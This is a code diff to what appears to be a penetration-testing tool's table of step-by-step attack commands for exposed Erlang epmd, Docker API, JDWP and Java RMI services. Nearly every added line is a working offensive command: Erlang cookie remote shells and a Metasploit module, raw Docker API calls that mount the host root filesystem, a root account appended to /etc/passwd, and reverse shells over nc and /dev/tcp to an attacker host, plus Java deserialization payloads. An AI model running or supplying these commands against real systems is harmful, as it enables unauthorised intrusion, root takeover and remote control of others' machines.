@@ -4541,12 +4541,14 @@ _STEP_COMMANDS = {
     "epmd": {
         1: [
             "epmd -d -names   # or: nmap -p4369 --script epmd-info <RHOST>",
+            "erl -noshell -eval 'io:format(\"~p~n\",[net_adm:names(\"<RHOST>\")]),halt().'   # remote node/port enum",
         ],
         2: [
             "cat ~/.erlang.cookie 2>/dev/null; find / -name .erlang.cookie 2>/dev/null",
         ],
         3: [
-            "# with a cookie: erl -sname pwn -setcookie <COOKIE> -remsh <NODE>@<RHOST>  then os:cmd(\"id\").",
+            "erl -setcookie <COOKIE> -name pwn@<LHOST> -remsh <NODE>@<RHOST>   # then: os:cmd(\"id\").",
+            "msfconsole -q -x 'use exploit/multi/misc/erlang_cookie_rce; set RHOSTS <RHOST>; set COOKIE <COOKIE>; run'",
         ],
         4: [
             "# common on RabbitMQ / CouchDB clusters — pivot into those",
@@ -4566,6 +4568,9 @@ _STEP_COMMANDS = {
         ],
         3: [
             "docker -H tcp://<RHOST>:2375 run -it --rm -v /:/host alpine chroot /host sh",
+            "# if alpine can't be pulled, use an image already present from step 2 (docker images) instead of alpine",
+            "curl -sk -X POST http://<RHOST>:2375/containers/create -H 'Content-Type: application/json' -d '{\"Image\":\"alpine\",\"Cmd\":[\"chroot\",\"/host\",\"sh\",\"-c\",\"id\"],\"HostConfig\":{\"Binds\":[\"/:/host\"]}}'",
+            "curl -sk -X POST http://<RHOST>:2375/containers/<ID>/start   # no docker CLI? raw API fallback",
         ],
         4: [
             "docker -H tcp://<RHOST>:2375 run -v /:/host alpine sh -c 'echo \"pwn::0:0::/root:/bin/sh\" >> /host/etc/passwd'",
@@ -4580,12 +4585,15 @@ _STEP_COMMANDS = {
     "jdwp": {
         1: [
             "nmap -sV -p<RPORT> <RHOST>   # JDWP-Handshake in the banner",
+            "(printf 'JDWP-Handshake'; sleep 1) | nc <RHOST> <RPORT>   # echoes 'JDWP-Handshake' = confirmed",
         ],
         2: [
             "python3 jdwp-shellifier.py -t <RHOST> -p <RPORT> --cmd 'id'",
+            "python3 jdwp-shellifier.py -t <RHOST> -p <RPORT> --break-on 'java.lang.Object.toString' --cmd 'id'   # default breakpoint may never fire — pick a method the app actually calls",
         ],
         3: [
             "python3 jdwp-shellifier.py -t <RHOST> -p <RPORT> --cmd 'nc <LHOST> <LPORT> -e /bin/sh'",
+            "python3 jdwp-shellifier.py -t <RHOST> -p <RPORT> --cmd 'bash -c \"bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1\"'",
         ],
         4: [
             "# HackTricks JDWP: https://book.hacktricks.xyz/network-services-pentesting/pentesting-jdwp-java-debug-wire-protocol",
@@ -4594,9 +4602,12 @@ _STEP_COMMANDS = {
     "rmi": {
         1: [
             "nmap -sV -p<RPORT> --script rmi-dumpregistry <RHOST>",
+            "rmg enum <RHOST> <RPORT>          # bound names, known CVEs, deser filter status",
+            "rmg guess <RHOST> <RPORT>         # discover callable methods (method-based attacks)",
             "java -jar BaRMIe.jar -enum <RHOST> <RPORT>",
         ],
         2: [
+            "rmg serial <RHOST> <RPORT> CommonsCollections6 'bash -c \"bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1\"' --bound-name <NAME>",
             "java -jar ysoserial.jar CommonsCollections5 'nc <LHOST> <LPORT> -e /bin/sh' > payload.bin",
             "java -cp BaRMIe.jar Attacks.RMIObjectRefDeserialize <RHOST> <RPORT> payload.bin",
         ],
